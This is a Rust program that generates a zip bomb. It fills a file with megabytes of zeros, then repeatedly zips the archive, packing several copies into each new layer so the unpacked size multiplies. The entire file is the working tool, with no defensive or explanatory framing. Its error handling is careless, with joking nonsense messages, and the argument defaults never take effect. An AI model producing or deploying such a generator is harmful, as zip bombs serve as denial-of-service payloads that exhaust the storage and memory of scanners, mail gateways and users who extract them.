use std::{env, fs::File, io::{self, Write}, path::{Path, PathBuf}};
use zip::{write::FileOptions, ZipWriter};

#[derive(Debug)]
struct Cli {
  initial_fsize: f64,
  layers: i32,
  file_name: String
}

fn main() -> Result<(), Box<dyn std::error::Error>>{
  let args: Vec<String> = env::args().collect();
  
  // store args in struct
  let cli = Cli {
    initial_fsize: args[1].parse::<f64>().ok().or(Some(10.0)).unwrap(),
    layers: args[2].parse::<i32>().ok().or(Some(4)).unwrap(),
    file_name: args[3].parse::<String>().ok().or(Some("YAZZ".to_string())).unwrap()
  };

  let full_name = format!("{}.zip",cli.file_name);

  let path = Path::new(&full_name);
  let file = File::create(&path)?;

  // file contents
  let f_contents = "0".repeat((cli.initial_fsize * 1048576.0) as usize);

  // initial file creation
  let mut zip = ZipWriter::new(file);
  zip.start_file(cli.file_name, FileOptions::default())?;
  zip.write_all(f_contents.as_bytes())?;
  zip.finish()?;

  for _ in 0..cli.layers {
    copy_contents(PathBuf::from(full_name.clone()),full_name.clone(), cli.layers);  
  }

  Ok(())
}

fn copy_contents(path:PathBuf, name:String, amount: i32) -> File {
  let mut file = File::open(path).expect("no filé");
  let mut buf = Vec::new();
  io::copy(&mut file, &mut buf).expect("wda error handling hehe");
  
  let temp = File::create(&Path::new(&name)).expect("waoidajdoawdjiaw Error hadnalign");
  let mut zip = ZipWriter::new(temp);

  for i in 0..amount {
    zip.start_file(format!("{}.zip", i.to_string()), FileOptions::default()).expect("Err");
    zip.write_all(&buf).expect("Err 2");
  }
  zip.finish().expect("wadijdaodaw error handling hehe")
}